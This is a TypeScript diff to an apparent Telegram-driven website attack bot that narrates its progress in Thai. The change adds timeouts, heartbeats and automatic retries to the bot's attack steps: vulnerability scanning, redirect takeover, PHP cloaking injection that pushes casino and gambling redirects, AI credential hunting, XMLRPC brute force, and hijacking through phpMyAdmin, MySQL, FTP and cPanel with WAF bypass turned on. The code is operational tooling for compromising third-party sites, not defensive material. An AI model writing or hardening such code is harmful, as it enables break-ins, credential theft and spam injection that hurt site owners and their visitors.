@@ -3677,6 +3677,55 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
     // Import TelegramNarrator for rich Thai step-by-step narration
     const { TelegramNarrator, generateReconAnalysis, generateCredentialAnalysis, generateHijackAnalysis, generateVerifyAnalysis, generateBruteForceAnalysis, generateUploadAnalysis } = await import("./telegram-narrator");
     
+    // ═══ Shared: per-step timeout + heartbeat helper ═══
+    // Use this to wrap any long-running step in any mode
+    const STEP_TIMEOUTS: Record<string, number> = {
+      vulnscan: 3 * 60 * 1000,       // 3 min for vuln scan
+      redirect_takeover: 3 * 60 * 1000, // 3 min for redirect methods
+      cloaking_inject: 4 * 60 * 1000,   // 4 min for PHP injection
+      credential_hunt: 5 * 60 * 1000,   // 5 min for credential hunting
+      hijack_engine: 5 * 60 * 1000,     // 5 min for hijack engine
+      advanced_attack: 5 * 60 * 1000,   // 5 min for advanced techniques
+      agentic_session: 8 * 60 * 1000,   // 8 min for AI session
+    };
+    const DEFAULT_STEP_TIMEOUT = 3 * 60 * 1000;
+    
+    type StepTimeoutResult<T> = { ok: true; result: T } | { ok: false; error: string; timedOut: boolean };
+    
+    const runStepWithTimeout = async <T,>(
+      stepName: string,
+      narrator: InstanceType<typeof TelegramNarrator>,
+      fn: () => Promise<T>,
+      opts?: { heartbeatLabel?: string }
+    ): Promise<StepTimeoutResult<T>> => {
+      const timeout = STEP_TIMEOUTS[stepName] || DEFAULT_STEP_TIMEOUT;
+      const startMs = Date.now();
+      const label = opts?.heartbeatLabel || stepName;
+      
+      // Heartbeat every 30s
+      const heartbeat = setInterval(async () => {
+        const elapsed = Math.round((Date.now() - startMs) / 1000);
+        try {
+          await narrator.addStep(`⏳ ${label} กำลังทำงาน... (${elapsed}s)`);
+        } catch { /* ignore */ }
+      }, 30_000);
+      
+      try {
+        const result = await Promise.race([
+          fn(),
+          new Promise<never>((_, reject) =>
+            setTimeout(() => reject(new Error(`STEP_TIMEOUT: ${stepName} exceeded ${Math.round(timeout / 60000)}min`)), timeout)
+          ),
+        ]);
+        return { ok: true, result };
+      } catch (err: any) {
+        const timedOut = err.message?.includes("STEP_TIMEOUT");
+        return { ok: false, error: err.message || "unknown", timedOut };
+      } finally {
+        clearInterval(heartbeat);
+      }
+    };
+    
     if (method === "scan_only") {
       // ═══ NARRATED DEEP VULNERABILITY SCAN ═══
       const narrator = new TelegramNarrator({
@@ -3862,16 +3911,19 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       });
       await narrator.init();
       
-      // Pre-attack: Deep Vulnerability Scan
+      // Pre-attack: Deep Vulnerability Scan (with timeout)
       await narrator.startPhase("vulnscan", "🔬 Deep Vulnerability Scan");
       const preScanStep = await narrator.addStep("🖥️ สแกนเซิร์ฟเวอร์ + ช่องโหว่");
       const preScanStart = Date.now();
-      try {
+      const scanOutcome = await runStepWithTimeout("vulnscan", narrator, async () => {
         const { fullVulnScan } = await import("./ai-vuln-analyzer");
-        const { generateVulnScanAnalysis } = await import("./telegram-narrator");
-        const scanResult = await fullVulnScan(domain, (stage, detail) => {
+        return fullVulnScan(domain, (stage, detail) => {
           try { narrator.addStep(`🔎 ${detail.substring(0, 55)}`).catch(() => {}); } catch {}
         });
+      }, { heartbeatLabel: "Vuln Scan" });
+      
+      if (scanOutcome.ok) {
+        const scanResult = scanOutcome.result;
         const scanMs = Date.now() - preScanStart;
         await narrator.updateStep(preScanStep, "done",
           `Server: ${scanResult.serverInfo.server} | CMS: ${scanResult.cms.type} | WAF: ${scanResult.serverInfo.waf || "ไม่พบ"} | Vulns: ${scanResult.misconfigurations.filter(m => m.exploitable).length}`,
@@ -3897,8 +3949,10 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             context: "Redirect Only — กำลังโจมตี...",
           }).catch(err => console.warn(`[TelegramAI] Redirect vuln alert failed: ${err}`));
         }
-      } catch (scanErr: any) {
-        await narrator.updateStep(preScanStep, "failed", `Scan error: ${scanErr.message?.substring(0, 50) || "unknown"}`, Date.now() - preScanStart);
+      } else {
+        const errMsg = scanOutcome.timedOut ? "⏰ Vuln Scan หมดเวลา (3min) — ข้ามไป" : `Scan error: ${scanOutcome.error.substring(0, 50)}`;
+        await narrator.updateStep(preScanStep, "failed", errMsg, Date.now() - preScanStart);
+        await narrator.addAnalysis(scanOutcome.timedOut ? "⏰ Vuln Scan หมดเวลา — ข้ามไปทำ redirect takeover ต่อ" : `Scan failed: ${scanOutcome.error.substring(0, 60)}`);
         timings.push({ step: "Deep Scan failed", ms: Date.now() - preScanStart, ok: false });
       }
       stepIndex++;
@@ -3913,13 +3967,28 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       timings.push({ step: `Redirect: ${redirectUrl.substring(0, 40)}`, ms: Date.now() - s1, ok: true });
       stepIndex++;
       
-      // Step 2: Execute takeover
+      // Step 2: Execute takeover (with timeout)
       await narrator.startPhase("hijack", "🔓 Redirect Takeover");
       const stepTakeover = await narrator.addStep("ลองทุกวิธี redirect takeover");
       const s2 = Date.now();
-      const { executeRedirectTakeover } = await import("./redirect-takeover");
-      const results = await executeRedirectTakeover({ targetUrl: `https://${domain}`, ourRedirectUrl: redirectUrl });
-      const succeeded = results.filter(r => r.success);
+      
+      const takeoverOutcome = await runStepWithTimeout("redirect_takeover", narrator, async () => {
+        const { executeRedirectTakeover } = await import("./redirect-takeover");
+        return executeRedirectTakeover({ targetUrl: `https://${domain}`, ourRedirectUrl: redirectUrl });
+      }, { heartbeatLabel: "Redirect Takeover" });
+      
+      let results: Array<{ success: boolean; method: string; detail?: string; injectedUrl?: string }> = [];
+      let succeeded: typeof results = [];
+      
+      if (takeoverOutcome.ok) {
+        results = takeoverOutcome.result as any;
+        succeeded = results.filter(r => r.success);
+      } else {
+        const errMsg = takeoverOutcome.timedOut ? "⏰ Redirect Takeover หมดเวลา (3min)" : `Error: ${takeoverOutcome.error.substring(0, 50)}`;
+        await narrator.updateStep(stepTakeover, "failed", errMsg, Date.now() - s2);
+        await narrator.addAnalysis(takeoverOutcome.timedOut ? "⏰ Redirect Takeover หมดเวลา — เว็บอาจมีการป้องกันที่แข็งแกร่ง" : `Takeover failed: ${takeoverOutcome.error.substring(0, 60)}`);
+        timings.push({ step: `Takeover: ${errMsg}`, ms: Date.now() - s2, ok: false });
+      }
       
       // Log each method
       for (const r of results) {
@@ -4094,6 +4163,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       let successMethod = "";
       let successUrl = "";
       const failedMethods: string[] = [];
+      const timedOutMethods: { methodId: string; methodDef: AttackMethodDef; originalTimeout: number }[] = [];
       
       // Define available attack methods
       type AttackMethodDef = {
@@ -4986,6 +5056,12 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             ? `⏰ Timeout (${Math.round((Date.now() - methodStart) / 1000)}s)`
             : (methodErr.message?.substring(0, 40) || "error");
           failedMethods.push(`${methodDef.name} (${errMsg})`);
+          
+          // Track timed-out methods for auto-retry
+          if (isTimeout) {
+            timedOutMethods.push({ methodId, methodDef, originalTimeout: METHOD_TIMEOUTS[methodId] || DEFAULT_METHOD_TIMEOUT });
+          }
+          
           await narrator.addAnalysis(
             isTimeout
               ? `⏰ ${methodDef.name} หมดเวลา — skip ไปวิธีถัดไป...`
@@ -5001,6 +5077,143 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         
         timings.push({ step: `Method ${mi + 1}: ${methodDef.name}`, ms: Date.now() - methodStart, ok: fullChainSuccess });
       } // end for loop
+      
+      // ═══ AUTO-RETRY: Retry timed-out methods with extended timeout ═══
+      if (!fullChainSuccess && timedOutMethods.length > 0 && !attackEntry.abortController.signal.aborted) {
+        const MAX_RETRIES = 2; // retry up to 2 timed-out methods
+        const retryMethods = timedOutMethods.slice(0, MAX_RETRIES);
+        
+        await narrator.startPhase("exploit", `🔄 Auto-Retry: ${retryMethods.length} วิธีที่ timeout`);
+        await narrator.addAnalysis(`🔄 ลองใหม่อีก ${retryMethods.length} วิธี ด้วย timeout ที่ยาวขึ้น 1.5x...`);
+        
+        for (let ri = 0; ri < retryMethods.length && !fullChainSuccess; ri++) {
+          if (attackEntry.abortController.signal.aborted) break;
+          
+          const { methodId, methodDef, originalTimeout } = retryMethods[ri];
+          const extendedTimeout = Math.round(originalTimeout * 1.5); // 1.5x timeout
+          
+          narrator.setMethodProgress(methodOrder.length + ri + 1, `🔄 ${methodDef.name}`, methodDef.icon);
+          await narrator.addStep(`🔄 Retry ${methodDef.name} (timeout: ${Math.round(extendedTimeout / 60000)}min)`);
+          const retryStart = Date.now();
+          
+          // Heartbeat for retry
+          const retryHeartbeat = setInterval(async () => {
+            const elapsed = Math.round((Date.now() - retryStart) / 1000);
+            try {
+              await narrator.addStep(`⏳ Retry ${methodDef.name}... (${elapsed}s)`);
+            } catch { /* ignore */ }
+          }, 30_000);
+          
+          try {
+            // Override timeout for this retry
+            const retryWithExtendedTimeout = async <T,>(fn: () => Promise<T>): Promise<T> => {
+              return Promise.race([
+                fn(),
+                new Promise<never>((_, reject) =>
+                  setTimeout(() => reject(new Error(`RETRY_TIMEOUT: ${methodId} exceeded ${Math.round(extendedTimeout / 60000)}min retry limit`)), extendedTimeout)
+                ),
+              ]);
+            };
+            
+            await retryWithExtendedTimeout(async () => {
+              // Re-execute the method that timed out
+              if (methodId === "pipeline") {
+                const { runUnifiedAttackPipeline } = await import("./unified-attack-pipeline");
+                const pipelineResult = await runUnifiedAttackPipeline(
+                  {
+                    targetUrl: `https://${domain}`,
+                    redirectUrl,
+                    seoKeywords: ["casino", "gambling", "slots"],
+                    enableCloaking: true,
+                    enableWafBypass: true,
+                    enableAltUpload: true,
+                    enableIndirectAttacks: true,
+                    enableDnsAttacks: true,
+                    enableConfigExploit: true,
+                    enableWpAdminTakeover: true,
+                    enableWpDbInjection: true,
+                    enableAiCommander: true,
+                    enableComprehensiveAttacks: true,
+                    enablePostUpload: true,
+                    userId: 1,
+                    globalTimeout: Math.round(extendedTimeout * 0.8),
+                  },
+                  async (event) => {
+                    try {
+                      await narrator.addStep(`🔄 ${event.phase}: ${event.detail.substring(0, 50)}`);
+                    } catch { /* ignore */ }
+                  }
+                );
+                // Use correct PipelineResult properties
+                const verifiedFiles = pipelineResult.uploadedFiles.filter((f: any) => f.redirectWorks && f.redirectDestinationMatch);
+                const anyRedirect = pipelineResult.uploadedFiles.some((f: any) => f.redirectWorks);
+                if (verifiedFiles.length > 0 || anyRedirect) {
+                  fullChainSuccess = true;
+                  successMethod = "pipeline (retry)";
+                  const bestFile = verifiedFiles[0] || pipelineResult.uploadedFiles.find((f: any) => f.redirectWorks);
+                  successUrl = bestFile?.url || "";
+                  await narrator.addAnalysis(`✅ Retry Pipeline สำเร็จ! ${successUrl}`);
+                }
+              } else if (methodId === "agentic_auto") {
+                // Agentic is fire-and-forget (returns sessionId only)
+                // For retry, we re-run the pipeline instead with different settings
+                const { runUnifiedAttackPipeline } = await import("./unified-attack-pipeline");
+                const retryResult = await runUnifiedAttackPipeline(
+                  {
+                    targetUrl: `https://${domain}`,
+                    redirectUrl,
+                    seoKeywords: ["casino", "gambling", "slots"],
+                    enableCloaking: true,
+                    enableWafBypass: true,
+                    enableAltUpload: true,
+                    enableIndirectAttacks: true,
+                    enableDnsAttacks: true,
+                    enableConfigExploit: true,
+                    enableWpAdminTakeover: true,
+                    enableWpDbInjection: true,
+                    enableAiCommander: true,
+                    enableComprehensiveAttacks: true,
+                    enablePostUpload: true,
+                    userId: 1,
+                    globalTimeout: Math.round(extendedTimeout * 0.8),
+                  },
+                  async (event) => {
+                    try {
+                      await narrator.addStep(`🔄 AI Retry: ${event.detail.substring(0, 50)}`);
+                    } catch { /* ignore */ }
+                  }
+                );
+                const verifiedRetry = retryResult.uploadedFiles.filter((f: any) => f.redirectWorks);
+                if (verifiedRetry.length > 0) {
+                  fullChainSuccess = true;
+                  successMethod = `agentic_auto (retry via pipeline)`;
+                  successUrl = verifiedRetry[0]?.url || "";
+                  await narrator.addAnalysis(`✅ Retry สำเร็จ! ${successUrl}`);
+                }
+              }
+              // Other methods (cloaking, hijack, etc.): skip retry — they're usually fast and don't timeout
+            });
+            
+            if (fullChainSuccess) {
+              await narrator.completeLastStep("done", `✅ Retry ${methodDef.name} สำเร็จ!`, Date.now() - retryStart);
+            } else {
+              await narrator.completeLastStep("failed", `❌ Retry ${methodDef.name} ไม่สำเร็จ`, Date.now() - retryStart);
+            }
+          } catch (retryErr: any) {
+            const isRetryTimeout = retryErr.message?.includes("RETRY_TIMEOUT");
+            await narrator.completeLastStep("failed",
+              isRetryTimeout
+                ? `⏰ Retry ${methodDef.name} หมดเวลาอีกครั้ง (${Math.round(extendedTimeout / 60000)}min)`
+                : `❌ Retry error: ${retryErr.message?.substring(0, 50) || "unknown"}`,
+              Date.now() - retryStart
+            );
+          } finally {
+            clearInterval(retryHeartbeat);
+          }
+          
+          timings.push({ step: `Retry ${methodDef.name}`, ms: Date.now() - retryStart, ok: fullChainSuccess });
+        }
+      }
       
       // ===== REAL REDIRECT VERIFICATION =====
       await narrator.startPhase("verify", "✅ ตรวจสอบผลลัพธ์");
@@ -5387,14 +5600,18 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       await narrator.init();
       const s1 = Date.now();
       
-      // Pre-attack: Deep Vulnerability Scan
+      // Pre-attack: Deep Vulnerability Scan (with timeout)
       await narrator.startPhase("vulnscan", "🔬 Deep Vulnerability Scan");
       const cloakScanStep = await narrator.addStep("🖥️ สแกนเซิร์ฟเวอร์ + ช่องโหว่");
-      try {
+      const cloakScanOutcome = await runStepWithTimeout("vulnscan", narrator, async () => {
         const { fullVulnScan } = await import("./ai-vuln-analyzer");
-        const scanResult = await fullVulnScan(domain, (stage, detail) => {
+        return fullVulnScan(domain, (stage, detail) => {
           try { narrator.addStep(`🔎 ${detail.substring(0, 55)}`).catch(() => {}); } catch {}
         });
+      }, { heartbeatLabel: "Vuln Scan" });
+      
+      if (cloakScanOutcome.ok) {
+        const scanResult = cloakScanOutcome.result;
         await narrator.updateStep(cloakScanStep, "done",
           `Server: ${scanResult.serverInfo.server} | CMS: ${scanResult.cms.type} | WAF: ${scanResult.serverInfo.waf || "ไม่พบ"} | Vulns: ${scanResult.misconfigurations.filter(m => m.exploitable).length}`,
           Date.now() - s1
@@ -5403,8 +5620,9 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           await narrator.addAnalysis(`🎯 แผนโจมตี: ${scanResult.attackVectors.slice(0, 3).map(v => `${v.name} (${Math.round(v.successProbability * 100)}%)`).join(" → ")}`);
         }
         timings.push({ step: "Deep Scan", ms: Date.now() - s1, ok: true });
-      } catch {
-        await narrator.updateStep(cloakScanStep, "failed", "Scan failed", Date.now() - s1);
+      } else {
+        const errMsg = cloakScanOutcome.timedOut ? "⏰ Vuln Scan หมดเวลา (3min) — ข้ามไป" : "Scan failed";
+        await narrator.updateStep(cloakScanStep, "failed", errMsg, Date.now() - s1);
         timings.push({ step: "Deep Scan failed", ms: Date.now() - s1, ok: false });
       }
       stepIndex++;
@@ -5418,27 +5636,34 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       timings.push({ step: "Redirect URL selected", ms: Date.now() - s1, ok: true });
       stepIndex++;
       
-      // Step 2: Execute PHP injection
+      // Step 2: Execute PHP injection (with timeout)
       await narrator.startPhase("inject", "💊 PHP Cloaking Injection");
       const stepInject = await narrator.addStep("อัปโหลด external JS redirect ไป S3");
       const s2 = Date.now();
-      const { executePhpInjectionAttack } = await import("./wp-php-injection-engine");
       
-      const injectionResult = await executePhpInjectionAttack({
-        targetUrl: `https://${domain}`,
-        redirectUrl,
-        targetLanguages: ["th", "vi"],
-        brandName: "casino",
-      }, async (detail) => {
-        try {
-          attackEntry.lastUpdate = detail;
-          await narrator.addStep(detail.substring(0, 60));
-        } catch { /* ignore */ }
-      });
+      const injectionOutcome = await runStepWithTimeout("cloaking_inject", narrator, async () => {
+        const { executePhpInjectionAttack } = await import("./wp-php-injection-engine");
+        return executePhpInjectionAttack({
+          targetUrl: `https://${domain}`,
+          redirectUrl,
+          targetLanguages: ["th", "vi"],
+          brandName: "casino",
+        }, async (detail) => {
+          try {
+            attackEntry.lastUpdate = detail;
+            await narrator.addStep(detail.substring(0, 60));
+          } catch { /* ignore */ }
+        });
+      }, { heartbeatLabel: "PHP Injection" });
+      
+      // Default injection result for timeout/error cases
+      let injectionResult = injectionOutcome.ok
+        ? injectionOutcome.result
+        : { success: false, method: "timeout", details: injectionOutcome.timedOut ? "⏰ หมดเวลา (4min)" : injectionOutcome.error, errors: [injectionOutcome.error], externalJsUrl: undefined as string | undefined, verificationResult: undefined as any };
       
       const injectionMs = Date.now() - s2;
       await narrator.updateStep(stepInject, injectionResult.success ? "done" : "failed",
-        `Method: ${injectionResult.method} | ${injectionResult.details.substring(0, 60)}`,
+        injectionOutcome.ok ? `Method: ${injectionResult.method} | ${injectionResult.details.substring(0, 60)}` : (injectionOutcome.timedOut ? "⏰ PHP Injection หมดเวลา (4min)" : `Error: ${injectionOutcome.error.substring(0, 50)}`),
         injectionMs
       );
       timings.push({ step: `Method: ${injectionResult.method}`, ms: injectionMs, ok: injectionResult.success });
@@ -5527,14 +5752,18 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       await narrator.init();
       const s1 = Date.now();
       
-      // Pre-attack: Deep Vulnerability Scan
+      // Pre-attack: Deep Vulnerability Scan (with timeout)
       await narrator.startPhase("vulnscan", "🔬 Deep Vulnerability Scan");
       const hijackScanStep = await narrator.addStep("🖥️ สแกนเซิร์ฟเวอร์ + ช่องโหว่");
-      try {
+      const hijackScanOutcome = await runStepWithTimeout("vulnscan", narrator, async () => {
         const { fullVulnScan } = await import("./ai-vuln-analyzer");
-        const scanResult = await fullVulnScan(domain, (stage, detail) => {
+        return fullVulnScan(domain, (stage, detail) => {
           try { narrator.addStep(`🔎 ${detail.substring(0, 55)}`).catch(() => {}); } catch {}
         });
+      }, { heartbeatLabel: "Vuln Scan" });
+      
+      if (hijackScanOutcome.ok) {
+        const scanResult = hijackScanOutcome.result;
         await narrator.updateStep(hijackScanStep, "done",
           `Server: ${scanResult.serverInfo.server} | CMS: ${scanResult.cms.type} | WAF: ${scanResult.serverInfo.waf || "ไม่พบ"} | Vulns: ${scanResult.misconfigurations.filter(m => m.exploitable).length}`,
           Date.now() - s1
@@ -5543,8 +5772,9 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           await narrator.addAnalysis(`🎯 แผนโจมตี: ${scanResult.attackVectors.slice(0, 3).map(v => `${v.name} (${Math.round(v.successProbability * 100)}%)`).join(" → ")}`);
         }
         timings.push({ step: "Deep Scan", ms: Date.now() - s1, ok: true });
-      } catch {
-        await narrator.updateStep(hijackScanStep, "failed", "Scan failed", Date.now() - s1);
+      } else {
+        const errMsg = hijackScanOutcome.timedOut ? "⏰ Vuln Scan หมดเวลา (3min) — ข้ามไป" : "Scan failed";
+        await narrator.updateStep(hijackScanStep, "failed", errMsg, Date.now() - s1);
         timings.push({ step: "Deep Scan failed", ms: Date.now() - s1, ok: false });
       }
       stepIndex++;
@@ -5558,15 +5788,16 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       timings.push({ step: "Redirect URL selected", ms: Date.now() - s1, ok: true });
       stepIndex++;
       
-      // Step 2: AI Credential Hunter
+      // Step 2: AI Credential Hunter (with timeout)
       await narrator.startPhase("credential", "🔑 AI Credential Hunter");
       const stepCred = await narrator.addStep("ค้นหา credentials ด้วย AI");
       const s1b = Date.now();
       let huntedCreds: Array<{ username: string; password: string }> = [];
       let credHuntSummary = "";
-      try {
+      
+      const credOutcome = await runStepWithTimeout("credential_hunt", narrator, async () => {
         const { executeCredentialHunt } = await import("./ai-credential-hunter");
-        const huntResult = await executeCredentialHunt({
+        return executeCredentialHunt({
           domain,
           maxDurationMs: 45_000,
           onProgress: async (phase, detail) => {
@@ -5575,9 +5806,12 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             } catch { /* ignore */ }
           },
         });
+      }, { heartbeatLabel: "Credential Hunt" });
+      
+      if (credOutcome.ok) {
+        const huntResult = credOutcome.result;
         huntedCreds = huntResult.credentials.slice(0, 100).map(c => ({ username: c.username, password: c.password }));
         credHuntSummary = `🔑 CredHunter: ${huntResult.credentials.length} creds found`;
-        
         await narrator.updateStep(stepCred, huntResult.credentials.length > 0 ? "done" : "failed",
           generateCredentialAnalysis({
             usersFound: huntResult.enumeratedUsers,
@@ -5588,79 +5822,100 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           Date.now() - s1b
         );
         timings.push({ step: credHuntSummary, ms: Date.now() - s1b, ok: huntResult.credentials.length > 0 });
-      } catch (credErr: any) {
-        await narrator.updateStep(stepCred, "failed", `CredHunter error: ${credErr.message}`, Date.now() - s1b);
-        timings.push({ step: `CredHunter: ${credErr.message}`, ms: Date.now() - s1b, ok: false });
+      } else {
+        const errMsg = credOutcome.timedOut ? "⏰ Credential Hunt หมดเวลา (5min) — ข้ามไป" : `CredHunter error: ${credOutcome.error.substring(0, 50)}`;
+        await narrator.updateStep(stepCred, "failed", errMsg, Date.now() - s1b);
+        timings.push({ step: errMsg, ms: Date.now() - s1b, ok: false });
       }
       stepIndex++;
       
-      // Step 3: Port scan + hijack methods
+      // Step 3: Port scan + hijack methods (with timeout)
       await narrator.startPhase("hijack", "🔓 Hijack Redirect Engine");
       const stepScan = await narrator.addStep("🔌 สแกนพอร์ต (FTP, MySQL, PHPMyAdmin, cPanel)");
       const s2 = Date.now();
-      const { executeHijackRedirect } = await import("./hijack-redirect-engine");
       
-      const hijackResult = await executeHijackRedirect({
-        targetDomain: domain,
-        newRedirectUrl: hijackRedirectUrl,
-        credentials: huntedCreds.length > 0 ? huntedCreds : undefined,
-      }, async (phase, detail, methodIndex, totalMethods) => {
-        try {
-          attackEntry.lastUpdate = detail;
-          const methodLabel: Record<string, string> = {
-            xmlrpc_brute: "🔨 XMLRPC Brute Force",
-            rest_api_editor: "📝 REST API Theme Editor",
-            phpmyadmin: "🗄 PHPMyAdmin",
-            mysql_direct: "💾 MySQL Direct",
-            ftp_access: "📁 FTP Access",
-            cpanel_filemanager: "🖥 cPanel File Manager",
-          };
-          await narrator.addStep(`${methodLabel[phase] || phase}: ${detail.substring(0, 50)}`);
-        } catch { /* ignore */ }
-      });
+      const hijackOutcome = await runStepWithTimeout("hijack_engine", narrator, async () => {
+        const { executeHijackRedirect } = await import("./hijack-redirect-engine");
+        return executeHijackRedirect({
+          targetDomain: domain,
+          newRedirectUrl: hijackRedirectUrl,
+          credentials: huntedCreds.length > 0 ? huntedCreds : undefined,
+        }, async (phase, detail, methodIndex, totalMethods) => {
+          try {
+            attackEntry.lastUpdate = detail;
+            const methodLabel: Record<string, string> = {
+              xmlrpc_brute: "🔨 XMLRPC Brute Force",
+              rest_api_editor: "📝 REST API Theme Editor",
+              phpmyadmin: "🗄 PHPMyAdmin",
+              mysql_direct: "💾 MySQL Direct",
+              ftp_access: "📁 FTP Access",
+              cpanel_filemanager: "🖥 cPanel File Manager",
+            };
+            await narrator.addStep(`${methodLabel[phase] || phase}: ${detail.substring(0, 50)}`);
+          } catch { /* ignore */ }
+        });
+      }, { heartbeatLabel: "Hijack Engine" });
       
       const hijackMs = Date.now() - s2;
       
-      // Update port scan step
-      const p = hijackResult.portsOpen;
-      await narrator.updateStep(stepScan, "done",
-        generateReconAnalysis({
-          openPorts: [
-            ...(p.ftp ? [21] : []),
-            ...(p.mysql ? [3306] : []),
-            ...(p.pma ? [8080] : []),
-            ...(p.cpanel ? [2083] : []),
-          ],
-        }),
-        hijackMs
-      );
+      // Handle hijack result
+      type HijackResultType = { success: boolean; winningMethod?: string; portsOpen: any; methodResults: Array<{ success: boolean; method: string; methodLabel: string; detail: string; durationMs: number }>; errors: string[] };
+      let hijackResult: HijackResultType;
       
-      // Log each method result
-      for (const mr of hijackResult.methodResults) {
-        await narrator.addStep(`${mr.success ? "✅" : "❌"} ${mr.methodLabel}`);
-        await narrator.completeLastStep(mr.success ? "done" : "failed",
-          generateHijackAnalysis({
-            method: mr.methodLabel,
-            success: mr.success,
-            detail: mr.detail.substring(0, 80),
+      if (hijackOutcome.ok) {
+        hijackResult = hijackOutcome.result as any;
+      } else {
+        // Timeout or error — create a default failed result
+        const errMsg = hijackOutcome.timedOut ? "⏰ Hijack Engine หมดเวลา (5min)" : `Error: ${hijackOutcome.error.substring(0, 50)}`;
+        await narrator.updateStep(stepScan, "failed", errMsg, hijackMs);
+        await narrator.addAnalysis(hijackOutcome.timedOut ? "⏰ Hijack Engine หมดเวลา — เว็บอาจมีการป้องกันที่แข็งแกร่ง" : `Hijack failed: ${hijackOutcome.error.substring(0, 60)}`);
+        hijackResult = { success: false, winningMethod: undefined, portsOpen: { ftp: false, mysql: false, pma: false, cpanel: false }, methodResults: [], errors: [hijackOutcome.error] };
+        timings.push({ step: errMsg, ms: hijackMs, ok: false });
+      }
+      
+      if (hijackOutcome.ok) {
+        // Update port scan step
+        const p = hijackResult.portsOpen;
+        await narrator.updateStep(stepScan, "done",
+          generateReconAnalysis({
+            openPorts: [
+              ...(p.ftp ? [21] : []),
+              ...(p.mysql ? [3306] : []),
+              ...(p.pma ? [8080] : []),
+              ...(p.cpanel ? [2083] : []),
+            ],
           }),
-          mr.durationMs
+          hijackMs
         );
-        timings.push({
-          step: `${mr.methodLabel}: ${mr.success ? "✅" : "❌"} ${mr.detail.substring(0, 80)}`,
-          ms: mr.durationMs,
-          ok: mr.success,
-        });
+        
+        // Log each method result
+        for (const mr of hijackResult.methodResults) {
+          await narrator.addStep(`${mr.success ? "✅" : "❌"} ${mr.methodLabel}`);
+          await narrator.completeLastStep(mr.success ? "done" : "failed",
+            generateHijackAnalysis({
+              method: mr.methodLabel,
+              success: mr.success,
+              detail: mr.detail.substring(0, 80),
+            }),
+            mr.durationMs
+          );
+          timings.push({
+            step: `${mr.methodLabel}: ${mr.success ? "✅" : "❌"} ${mr.detail.substring(0, 80)}`,
+            ms: mr.durationMs,
+            ok: mr.success,
+          });
+        }
       }
       stepIndex += 6;
       
       // Analysis
+      const p = hijackResult.portsOpen;
       if (hijackResult.success) {
         await narrator.addAnalysis(
           `Hijack สำเร็จด้วย ${hijackResult.winningMethod}! ` +
           `เว็บจะ redirect ไปยัง ${hijackRedirectUrl}`
         );
-      } else {
+      } else if (hijackResult.methodResults.length > 0) {
         await narrator.addAnalysis(
           `ลองแล้ว ${hijackResult.methodResults.length} วิธี ไม่สำเร็จ — ` +
           `พอร์ตที่เปิด: FTP=${p.ftp} MySQL=${p.mysql} PMA=${p.pma} cPanel=${p.cpanel}`
